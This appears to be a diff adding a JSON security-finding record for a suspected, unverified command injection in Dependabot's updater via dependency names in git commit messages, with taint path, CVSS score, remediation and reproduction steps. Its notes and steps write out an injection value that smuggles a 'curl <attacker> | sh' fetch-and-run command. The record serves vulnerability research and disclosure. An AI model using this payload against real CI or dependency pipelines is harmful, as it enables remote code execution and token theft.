@@ -1,0 +1,47 @@
+{
+  "title": "Dependabot Updater Command Injection via Dependency Name in Git Commit Message → RCE",
+  "severity": "critical",
+  "defect_family": "command-injection",
+  "root_cause_key": "unsafe-shell-interpolation-dependency-name",
+  "auth_context": "anonymous",
+  "canonical_location": "https://github.com/dependabot/dependabot-core/blob/cc2be3e976d5106b02a65b01d0d9bf3a0f7b6ed5/common/lib/dependabot/workspace/git.rb:133",
+  "summary": "An attacker-controlled dependency name (parsed from a manifest key by the Dependabot updater) is interpolated into a double-quoted shell string `git commit -m \"#{msg}\"` executed via `run_shell_command(..., allow_unsafe_shell_command: true)`, which forwards the string verbatim to `IO.popen`. `Dependency` performs no name validation/sanitization. In grouped-update jobs this yields RCE / arbitrary command execution in the Dependabot updater container. UNVERIFIED STATIC ANALYSIS CANDIDATE — not yet confirmed; requires live reachability verification.",
+  "evidence_ref": "c1_rce_report.md",
+  "evidence_type": "code-inferred",
+  "notes": "Static analysis only. No live target touched, nothing submitted. Evidence artifacts: c1_rce_report.md and deep_dependabot_analysis.md. Injection example: dependency name `foo\" && curl -s <attacker> | sh && \"` yields `git commit -m \"Updating foo\" && curl -s <attacker> | sh && \"\"` → arbitrary command execution under IO.popen. Sink locations: common/lib/dependabot/workspace/git.rb:133-137 (git commit), git.rb:119-123 (stash), command_helpers.rb:243 (IO.popen), group_update_creation.rb:744 (memo), group_update_creation.rb:76 (stash memo).",
+  "details": {
+    "cwe_id": "CWE-78",
+    "owasp_category": "A03:2021 Injection",
+    "impact": "RCE / arbitrary command execution in the Dependabot updater container (dependabot-core workspace). Attacker gains code execution, file write, and env/token exfiltration in the updater process — strictly more severe than VA-912's read-only arbitrary host file read.",
+    "evidence": "Static dataflow: group_update_creation.rb:744 builds memo `\"Updating #{dependency.name}\"` via Workspace.store_change; Workspace::Git#commit (git.rb:133-137) interpolates that memo into `git commit -m \"#{msg}\"` and runs it through run_shell_command with allow_unsafe_shell_command: true, whose raw string is passed verbatim to IO.popen (command_helpers.rb:243). dependency.name is attacker-controlled from a manifest key; Dependency performs no name validation/sanitization. No runtime/live reproduction performed — candidate unverified.",
+    "entry_point": "group_update_creation.rb:744 store_change memo (memo: \"Updating #{dependency.name}\") in grouped-update updater job",
+    "sink": "workspace/git.rb:133-137 — `git commit -m \"#{msg}\"` via run_shell_command(allow_unsafe_shell_command: true) → IO.popen (command_helpers.rb:243)",
+    "function": "Workspace::Git#commit / #stash",
+    "taint_path": "manifest dependency key → Dependency#name (no sanitization) → group_update_creation.rb:744 `\"Updating #{dependency.name}\"` → Workspace::Git#commit `git commit -m \"#{msg}\"` → run_shell_command(allow_unsafe_shell_command: true) → IO.popen",
+    "guards_evaluated": "No name validation/sanitization on Dependency; shell string is double-quoted but metacharacters (\" && ; ` $ etc.) break out of quotes; allow_unsafe_shell_command: true disables safe-arg path",
+    "slot_type": "DEPENDENCY-NAME",
+    "parameter": "dependency.name (manifest key)",
+    "source_anchor": "memo: \"Updating #{dependency.name}\" at updater/lib/dependabot/updater/group_update_creation.rb:744",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "remediation": "1) Escape/sanitize dependency name before shell interpolation (Shellwords.escape). 2) Avoid shell entirely — use Rugged/git library APIs. 3) Validate Dependency names (reject shell metacharacters). 4) Set allow_unsafe_shell_command: false for git commit/stash calls.",
+    "steps_to_reproduce": [
+      "Configure a Dependabot grouped-update job (groups: in dependabot.yml) for npm/yarn or pip.",
+      "Ensure job.clone? is true and DEPENDABOT_REPO_CONTENTS_PATH is set so prepare_workspace activates the git workspace.",
+      "Add a malicious dependency name with shell metacharacters (e.g. foo\" && curl -s <attacker> | sh && \") to the manifest.",
+      "Trigger the grouped update so the dependency is updated (changes.any? true).",
+      "Workspace::Git#commit executes git commit -m \"Updating <name>\" with the unescaped name → command execution under IO.popen."
+    ],
+    "discovery_stage": "hunt",
+    "triage_bucket": "candidate",
+    "unresolved_prerequisite": "Live grouped-update job reachability verification in a real (or faithfully sandboxed) Dependabot updater environment — confirming the injected dependency name reaches git commit's shell string at runtime",
+    "disproof_stop_condition": "A runtime test demonstrates the dependency name is sanitized/escaped before shell interpolation, or the workspace/git path is not reachable for an attacker-controlled dependency name (path disproven).",
+    "honest_bounds": "Static analysis only. Injection mechanics are unambiguous from source, but reachability (grouped updates + workspace config + ecosystem parser passing name verbatim) is not yet proven live. Confidence medium-high. Must not be submitted until live verification.",
+    "chain_required": false,
+    "references": [
+      "https://cwe.mitre.org/data/definitions/78.html",
+      "https://github.com/dependabot/dependabot-core/commit/cc2be3e976d5106b02a65b01d0d9bf3a0f7b6ed5",
+      "deep_dependabot_analysis.md"
+    ]
+  }
+}
